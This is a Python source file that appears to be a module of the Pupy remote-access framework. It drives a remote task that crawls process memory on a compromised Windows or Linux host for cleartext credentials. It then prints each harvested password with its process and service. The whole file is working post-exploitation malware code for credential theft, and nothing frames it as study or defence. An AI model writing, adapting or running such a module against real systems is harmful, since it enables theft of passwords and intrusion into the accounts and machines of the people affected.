# -*- coding: utf-8 -*-
from pupylib.PupyModule import config, PupyModule, PupyArgumentParser

__class_name__="LootMemory"

@config(cat="creds", compat=["windows", "linux"])
class LootMemory(PupyModule):
    '''
        Crawl processes memory and look for cleartext credentials
    '''
    unique_instance = True
    dependencies = ['memorpy', 'loot_memory']

    @classmethod
    def init_argparse(cls):
        cls.arg_parser = PupyArgumentParser(prog='loot_memory', description=cls.__doc__)
        cls.arg_parser.add_argument('-p', '--poll', default=20, type=int, help='Poll interval (seconds)')
        cls.arg_parser.add_argument('action', choices=['start', 'stop', 'dump'])

    def run(self, args):
        start = self.client.remote('loot_memory', 'start')
        stop = self.client.remote('loot_memory', 'stop', False)
        dump = self.client.remote('loot_memory', 'dump')

        if args.action == 'start':
            ok = start(poll=args.poll)
            if ok:
                self.success('PwdMon has been started')
            else:
                self.error('PwdMon has not been started')

        elif args.action == 'dump':
            results = dump()
            if results is None:
                self.error('PwdMon is not started')
            else:
                for proc, service, pwd in results:
                    self.success('[{}][{}]{}'.format(proc, service, pwd))

        elif args.action == 'stop':
            stop()
